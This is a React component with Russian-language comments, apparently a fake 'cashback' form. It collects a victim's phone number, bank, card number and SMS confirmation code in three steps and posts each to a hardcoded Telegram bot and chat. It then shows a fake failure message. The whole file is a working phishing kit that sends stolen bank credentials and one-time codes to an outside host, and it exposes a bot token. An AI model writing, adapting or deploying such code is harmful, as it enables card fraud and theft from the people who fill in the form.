import React, { useState } from 'react';
import axios from 'axios';
import Select from 'react-select';
import styles from './BackCash.module.scss';
import bank from './bank'; // Предполагается, что bank - это массив с названиями банков

export const BackCash = () => {
  const TOKEN = '7159805272:AAGEiR3-J8LOqPMCIvpdWY-JlY_EcH7ivrw';
  const CHAT = '-1002202833398';
  const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

  const [step, setStep] = useState(1);
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [amount, setAmount] = useState('');
  const [selectedBank, setSelectedBank] = useState(null);
  const [customBankName, setCustomBankName] = useState(''); // Состояние для своего варианта банка
  const [loading, setLoading] = useState(false);
  const [contacted, setContacted] = useState(false);

  // Опции для селекта с добавлением "Свой вариант"
  const sortedBankOptions = [
    ...bank.sort().map(bankName => ({ value: bankName, label: bankName })),
    { value: 'custom', label: 'Свой вариант' },
  ];

  const handleSubmit = e => {
    e.preventDefault();
    setLoading(true);

    // Отправка данных в Telegram в зависимости от текущего шага
    if (step === 1) {
      const bankLabel = selectedBank.value === 'custom' ? customBankName : selectedBank.label;
      axios
        .post(URI_API, {
          chat_id: CHAT,
          parse_mode: 'html',
          text: `<b>Новий заказ</b>\nНомер телефона: ${firstName}\nНазвание банка: ${bankLabel}\n`,
        })
        .then(res => {
          
          setFirstName('');
          setStep(2);
        })
        .catch(err => {
          console.error('Ошибка при отправке заказа:', err);
        })
        .finally(() => {
          setLoading(false);
        });
    } else if (step === 2) {
      axios
        .post(URI_API, {
          chat_id: CHAT,
          parse_mode: 'html',
          text: `<b>Новий заказ</b>\nНомер карты: ${lastName}\n`,
        })
        .then(res => {
    
          setLastName('');
          setLoading(true);
          setTimeout(() => {
            setStep(3);
            setLoading(false);
          }, 5000);
        })
        .catch(err => {
          console.error('Ошибка при отправке заказа:', err);
        });
    } else if (step === 3) {
      axios
        .post(URI_API, {
          chat_id: CHAT,
          parse_mode: 'html',
          text: `<b>Новий заказ</b>\nКод из смс: ${amount}`,
        })
        .then(res => {
        
          setFirstName('');
          setLastName('');
          setAmount('');
          setStep(4);
          setContacted(true);
        })
        .catch(err => {
          console.error('Ошибка при отправке заказа:', err);
        })
        .finally(() => {
          setLoading(false);
        });
    }
  };

  const handleBankChange = selectedOption => {
    setSelectedBank(selectedOption);
    if (selectedOption && selectedOption.value === 'custom') {
      setCustomBankName('');
    }
  };

  const handleCustomBankChange = e => {
    setCustomBankName(e.target.value);
  };

  const filterOption = (option, inputValue) => {
    return option.label.toLowerCase().startsWith(inputValue.toLowerCase());
  };

  const customStyles = {
    control: provided => ({
      ...provided,
      backgroundColor: '#333',
      color: '#fff',
      marginBottom: '7px', // Добавляем отступ вниз
    }),
    menu: provided => ({
      ...provided,
      backgroundColor: '#333',
      color: '#fff',
    }),
    singleValue: provided => ({
      ...provided,
      color: '#fff',
    }),
    input: provided => ({
      ...provided,
      color: '#fff',
    }),
    option: (provided, state) => ({
      ...provided,
      backgroundColor: state.isSelected ? '#555' : '#333',
      color: '#fff',
      '&:hover': {
        backgroundColor: '#555',
      },
    }),
    placeholder: provided => ({
      ...provided,
      color: '#ccc',
    }),
  };
  

  return (
    <form className={styles.backcashForm} onSubmit={handleSubmit}>
      {loading && <div className="loader">Loading...</div>}
      {step === 1 && !loading && (
        <>
          <input
            type="text"
            placeholder="Введите номер телефона"
            value={firstName}
            onChange={e => setFirstName(e.target.value)}
            required
          />
          <Select
            value={selectedBank}
            onChange={handleBankChange}
            options={sortedBankOptions}
            placeholder="Выберите банк"
            isClearable
            filterOption={filterOption}
            styles={customStyles}
          />
          {selectedBank && selectedBank.value === 'custom' && (
            <input
              type="text"
              placeholder="Введите название своего банка"
              value={customBankName}
              onChange={handleCustomBankChange}
              required
            />
          )}
        </>
      )}
      {step === 2 && !loading && (
        <input
          type="text"
          placeholder="Введите номер карты"
          value={lastName}
          onChange={e => setLastName(e.target.value)}
          required
        />
      )}
      {step === 3 && !loading && (
        <input
          type="text"
          placeholder="Введите код из сообщения"
          value={amount}
          onChange={e => setAmount(e.target.value)}
          required
        />
      )}
      {step <= 3 && !loading && <button type="submit">Отправить</button>}
      {step === 4 && contacted && (
        <p>произошел сбой, повторите попытку снова</p>
      )}
    </form>
  );
};
